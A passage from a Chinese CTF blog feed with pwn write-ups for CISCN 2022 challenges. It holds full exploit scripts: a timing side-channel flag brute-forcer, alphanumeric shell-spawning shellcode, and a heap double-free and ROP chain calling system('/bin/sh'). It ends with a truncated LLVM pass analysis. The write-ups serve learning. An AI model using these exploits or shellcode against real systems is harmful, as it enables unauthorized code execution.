class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,idx+<span class="number">1</span>)</span><br><span class="line">    shellcode += <span class="string">&quot;mov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;add rax, 2&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">str</span>(char))</span><br><span class="line">    shellcode += shellcraft.amd64.linux.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Welcome to silent execution-box.&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;\033[0;33mmov al,[rsp+&#123;0&#125;];sub rax,&#123;1&#125;;add rax, 2;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">chr</span>(char)))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_time</span>(<span class="params">io</span>):</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recv()</span><br><span class="line">        io.recv(timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">1.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">io,idx,char</span>):</span><br><span class="line">    dynamite_sub(io,idx,char)      </span><br><span class="line">    <span class="keyword">if</span> check_time(io):</span><br><span class="line">      io1 = process(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line">      dynamite_add(io1,idx,char)</span><br><span class="line">      <span class="keyword">if</span> check_time(io1):</span><br><span class="line">        io1.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        io = process(<span class="string">&#x27;./silent&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> check(io,idx,char):</span><br><span class="line">          flag += <span class="built_in">chr</span>(char)</span><br><span class="line">          success(<span class="string">&quot;\033[0;32mflag[&#123;0&#125;]:&#123;1&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx),<span class="built_in">chr</span>(char)))</span><br><span class="line">          success(<span class="string">&quot;\033[0;32mflag:&#123;0&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        io.close()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 ciscn 初赛</title>
    <url>/2022/07/01/CTF/2022ciscn%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>主要是对程序逻辑的分析和可见字符的shellcode的编写，同时要注意shellcode的编写规则，这里是使用<code>rdx</code>进行触发。</p>
<blockquote>
<p> 参考文章：<a href="https://blog.csdn.net/SmalOSnail/article/details/105236336">(8条消息) 手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客_ascii shellcode</a></p>
</blockquote>
<p>使用alpha3的基本步骤：</p>
<ol>
<li><p>python运行以下脚本生成shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shellcode_x64&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)	<span class="comment"># 注意打开的格式是wb</span></span><br><span class="line">payload = asm(shellcraft.sh())	<span class="comment"># 可以手写</span></span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用命令生成可见字符的shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode_x64&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;47.93.176.13&#x27;, 25792)</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">TAYAXVI31VXPP[_Hc4:14:SX-&#125;/?w-x0An5C+&#123;(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-]oN&#125;-08/P5;W-vP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-!/o&gt;-uTX 5Xtp(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-~~/?-?!0,5GZ#SP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-^;?&#125;-w&quot; Z5#!f8P^14:WX-@``?-@??_-|``aP_Hc4:14:SX- ?^;-@@~@5%@VlP^14:WX-@``?-@??_-|``aP_SX- h#F- 9^@5X_~yP_Hc4:14:SX-W?/6-!@  5wb 9P^14:WX-@``?-@??_-|``aP_SX-.1o_-0wpx5&gt;V (P^SX-@~~7-Maaw5k  QP_AAAA|4oGf6^@nww`SjMMkct?=/w!&#123;~?&quot;uJ-&#x27;(R6sF`VUmo&#125;r__#33Vavp~0tS&lt;ZTC?Q-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)		<span class="comment"># 使用ae64生成的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;msg:ro0t\r\nopt:1\n\n&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">&#x27;msg:&#x27;</span> + shellcode + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;opt:2\n\n&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h2><p>通过整型溢出使得分配的堆块大小大于<code>0x21000</code>，此堆块的指针就与libc存在固定的偏移，由此我们可以通过show这一个功能来泄露libc的地址，同时也可以通过内指针和environ来泄露栈地址，最后进行rop。</p>
<blockquote>
<p>比赛中没能想到这一点，属是有点弱鸡≧ ﹏ ≦</p>
</blockquote>
<p><code>malloc(8*0x20005000)</code>，将会得到一个位于.tls段上的指针：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx <span class="variable">$rebase</span>(0x4190)</span></span><br><span class="line">0x557505d22190: 0x00007fb40f836010      0x0000000020005000</span><br></pre></td></tr></table></figure>

<p>一个小tips：可以通过pwndbg中的search命令来寻找内指针：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search</span></span><br><span class="line">usage: search [-h] [-t &#123;byte,short,word,dword,qword,pointer,string,bytes&#125;] [-1] [-2] [-4] [-8] [-p] [-x] [-s] [-e]</span><br><span class="line">              [-w] [--save] [--no-save] [-n]</span><br><span class="line">              value [mapping_name]</span><br><span class="line">search: error: the following arguments are required: value</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;environ</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (&lt;data variable, no debug info&gt; *) 0x7fb40fa82ec0 &lt;environ&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search -p 0x7fb40fa82ec0</span></span><br><span class="line">libc.so.6       0x7fb40fa79fb8 0x7fb40fa82ec0</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx 0x7fb40fa82ec0</span></span><br><span class="line">0x7fb40fa82ec0 &lt;environ&gt;:       0x00007ffd346f8448      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>通过double_free修改main函数的返回地址，最后退出程序即可get_shell。需要注意进行fake_chunk分配的时候，目标地址的环境是否能满足分配条件。</p>
<p>WP如下：</p>
<blockquote>
<p>e4l4师傅的模板还是挺香的(●’◡’●)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./newest_note&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./newest_note&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, data = <span class="string">&#x27;pursue&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">&quot;: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;How many pages your notebook will be? :&quot;</span>, <span class="built_in">str</span>(<span class="number">0x20005000</span>)) <span class="comment"># str()会将十六进制转化为十进制的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">0x4899a</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x218cc0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002e6c5</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d9b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">show(<span class="number">0x487f5</span>)</span><br><span class="line">stack_addr = uu64()</span><br><span class="line">lg(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i)  <span class="comment"># 0-9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)  <span class="comment"># 0-6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">key = u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)     <span class="comment"># double free</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">pld = p64((stack_addr - <span class="number">0x138</span>) ^ key)</span><br><span class="line">add(<span class="number">0</span>, pld)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">pld = p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">add(<span class="number">3</span>, pld)     <span class="comment"># change main_ret_address</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;: &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)     <span class="comment"># exit</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="satool-LLVM-Pwn"><a href="#satool-LLVM-Pwn" class="headerlink" title="satool(LLVM_Pwn)"></a>satool(LLVM_Pwn)</h2><p>LLVM_PASS的pwn题，做一下学习和总结：</p>
<blockquote>
<p>参考文章：</p>
<p><a href="https://zhuanlan.zhihu.com/p/122522485">LLVM Pass入门导引 - 知乎 (zhihu.com)</a></p>
<p>[<a href="https://bbs.pediy.com/thread-273119.htm">原创]LLVM PASS类pwn题入门-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p><a href="https://blog.csdn.net/qq_39948058/article/details/119938973">(11条消息) CTF$LLVM PWN学习_jsjsj11123的博客-CSDN博客</a></p>
<p><a href="https://lakwsh.net/?p=457">CISCN 2022 初赛 satool writeup – 数字的秘密基地 (lakwsh.net)</a></p>
</blockquote>
<p>在学习实例的过程中，注意LLVM的一些API的调用和理解(例如：<code>llvm::Value::getName</code>，详细了解我推荐看第二篇参考文章)，这将有助于我们进行代码审计，除此以外，我们主要逆向的是<code>runOnFunction</code>这个具有重写功能的函数。</p>
<p>下面是题目给的readme：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Introduction</span><br><span class="line"></span><br><span class="line">A LLVM Pass that can optimize add/sub instructions.</span><br><span class="line"></span><br><span class="line">## How to run</span><br><span class="line"></span><br><span class="line">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class="line"></span><br><span class="line">## Example</span><br><span class="line"></span><br><span class="line">### IR before optimization</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 2</span><br><span class="line">  %3 = add nsw i64 %2, 68</span><br><span class="line">  %4 = add nsw i64 %0, 6</span><br><span class="line">  %5 = add nsw i64 %4, -204</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### IR after optimization</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = mul i64 %0, 2</span><br><span class="line">  %3 = add i64 %2, -132</span><br><span class="line">  ret i64 %3</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一次接触这种题目，详细总结一下。</p>
</blockquote>
<p>首先在IDA里面找到runOnFunction函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD30 D0 EE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN12_GLOBAL__N_17MBAPassD2Ev ; `anonymous namespace<span class="number">&#x27;</span>::MBAPass::~MBAPass()</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD38 F0 EE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN12_GLOBAL__N_17MBAPassD0Ev ; `anonymous namespace<span class="number">&#x27;</span>::MBAPass::~MBAPass()</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD40 <span class="number">80</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD48 D0 <span class="number">02</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD50 F0 <span class="number">02</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD58 D0 DE <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module <span class="type">const</span>*)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD60 A0 DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>&amp;)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD68 <span class="number">90</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD70 <span class="number">48</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD78 <span class="number">30</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD80 <span class="number">70</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD88 <span class="number">98</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD90 <span class="number">00</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(<span class="type">void</span> <span class="type">const</span>*)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CD98 B8 DE <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CDA0 <span class="number">50</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CDA8 <span class="number">58</span> DF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CDB0 F8 DE <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CDB8 <span class="number">20</span> EF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN12_GLOBAL__N_17MBAPass13runOnFunctionERN4llvm8FunctionE ; `anonymous namespace<span class="number">&#x27;</span>::MBAPass::runOnFunction(llvm::Function &amp;)		<span class="comment">// 我在这里🤭</span></span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CDB8                               _data_rel_ro ends</span><br><span class="line">.data.rel.ro:<span class="number">000000000001</span>CDB8</span><br></pre></td></tr></table></figure>

<p>runOnFunction函数的主要漏洞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">this[<span class="number">5</span>] = this[<span class="number">4</span>];</span><br><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">`anonymous namespace<span class="number">&#x27;</span>::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);</span><br><span class="line">mprotect(this[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">v27 = `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);</span><br><span class="line">      </span><br><span class="line"><span class="comment">// handle函数主要漏洞：</span></span><br><span class="line">v32 = this;</span><br><span class="line">v31 = a2;</span><br><span class="line">v30 = *((_QWORD *)this + <span class="number">4</span>) + <span class="number">0xFF0</span>LL;</span><br><span class="line">v29 = (llvm::BasicBlock *)llvm::Function::front(a2);</span><br><span class="line">Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);</span><br><span class="line">Operand = llvm::User::getOperand(Terminator, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)this + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">    v2 = (llvm::ConstantInt 